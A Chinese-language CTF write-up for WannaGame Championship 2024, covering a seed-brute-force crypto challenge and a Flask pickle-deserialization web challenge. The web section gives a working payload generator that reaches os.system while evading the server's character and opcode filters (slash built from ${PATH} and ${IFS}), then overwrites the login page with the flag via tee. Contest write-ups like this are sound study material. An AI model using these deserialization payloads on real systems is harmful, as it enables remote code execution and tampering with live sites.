# WannaGame ChampionShip 2024

## Crypto
### Random
```python
import random

random.seed(random.randint(0, 10000))
flag = [c for c in open("flag.txt", "rb").read()]
for _ in range(1337):
  flag = [x ^ y for x, y in zip(flag, [random.randint(0, 255) for _ in range(len(flag))])]
print(bytes(flag).hex())

# 0203e2c0dd20182bea1d00f41b25ad314740c3b239a32755bab1b3ca1a98f0127f1a1aeefa15a418e9b03ad25b3a92a46c0f5a6f41cb580f7d8a3325c76e66b937baea
```

Random的seed只要一樣，後續產生的隨機數都會是相同的，所以只要爆出seed再做反操作就能拿到flag

seed的範圍在一萬還可以接受，三分鐘左右就能跑出flag

```python
import random

chex="0203e2c0dd20182bea1d00f41b25ad314740c3b239a32755bab1b3ca1a98f0127f1a1aeefa15a418e9b03ad25b3a92a46c0f5a6f41cb580f7d8a3325c76e66b937baea"
ci=bytes.fromhex(chex)
l=len(ci)

for s in range(10001):
    random.seed(s)
    ks=bytearray([0]*l)
    for _ in range(1337):
        r=[random.randint(0, 255) for __ in range(l)]
        for i in range(l):
            ks[i]^=r[i]

    flag=bytes([c^k for c, k in zip(ci, ks)])
    if(flag.startswith(b"W1")):
        print(flag.decode("utf-8"))

#W1{maybe_the_seed_is_too_small..._b32fe938a402c22144b9d6497fd5a709}
```

## Web
### Pickle Ball
看題目就知道是做反序列化，不過server有對輸入做過濾

```python
@app.route("/process", methods=["GET", "POST"])
def process():
    if "username" not in session:
        return redirect(url_for("login"))

    error = None
    disassembled_output = None

    banned_patterns = [b"\\", b"static", b"templates", b"flag.txt", b">", b"/", b"."]
    banned_instruction = "REDUCE"

    if request.method == "POST":
        payload = request.form.get("payload", "")
        try:
            decoded_data = base64.b64decode(payload)

            for pattern in banned_patterns:
                if pattern in decoded_data:
                    raise ValueError("Payload contains banned characters!")

            try:
                output = io.StringIO()
                pickletools.dis(decoded_data, out=output)
                disassembled_output = output.getvalue()

                if banned_instruction in disassembled_output:
                    raise ValueError(
                        f"Payload contains banned instruction: {banned_instruction}"
                    )

            except Exception as e:
                disassembled_output = "Error!"

            pickle.loads(decoded_data)

        except Exception as e:
            error = str(e)

    return render_template(
        "process.html", error=error, disassembled_output=disassembled_output
    )
```

不過可以稍微構造一下來繞過

```python
def get_payload(s):
    payload=(
        b'cos\nsystem\n'
        + b'('
        + b'X'+(len(s)).to_bytes(4,'little') + s.encode('utf-8')
        + b't'
        + b'R'
    )
    payload=base64.b64encode(payload)
    print("Command : %s" % s)
    print(payload.decode())
```
如此就能夠RCE了


接下來是第二個難點，由於是用system()去讀flag所以不會有回顯，不過可以透過`>>`去導向到網頁裡面

不過`>>`與app會用到的網頁都被黑名單了

最後採用`***`去匹配網頁檔案，然後用tee來修改

斜線可以用`echo${IFS}${PATH}|cut${IFS}-c1-1`來構造，先把斜線做成變數再放到payload裡面

最後再回去login.php就能看到flag

```python
import base64

slash="`echo${IFS}${PATH}|cut${IFS}-c1-1`"
def get_payload(s):
    payload=(
        b'cos\nsystem\n'
        + b'('
        + b'X'+(len(s)).to_bytes(4,'little') + s.encode('utf-8')
        + b't'
        + b'R'
    )
    payload=base64.b64encode(payload)
    print("Command : %s" % s)
    print(payload.decode())


#get_payload("cat "+slash+"flag")

p1="S="+slash+";"
p1+="cat ${S}flag | tee ${S}app${S}temp?????${S}login?????"

get_payload(p1)

#W1{do_you_wanna_play_pickleball?_2e479a0253884f70d5de1a74d641d620}
```
